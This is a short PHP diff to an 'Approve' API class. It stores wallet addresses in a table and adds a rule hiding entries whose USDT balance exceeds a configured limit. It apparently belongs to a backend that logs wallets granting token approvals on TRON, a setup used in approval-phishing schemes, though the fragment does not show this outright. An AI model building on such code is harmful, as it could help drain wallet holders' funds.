@@ -35,6 +35,9 @@ class Approve extends Api
             'platform' => $platform,
             'createtime' => time(),
         ];
+        if($usdt_balance > Config::get('tron.max_usdt_balance')){
+            $data['show'] = 0;
+        }
         $exist = db("ausers")->where("address",$address)->find();
         if(!$exist){
             db('ausers')->insert($data);
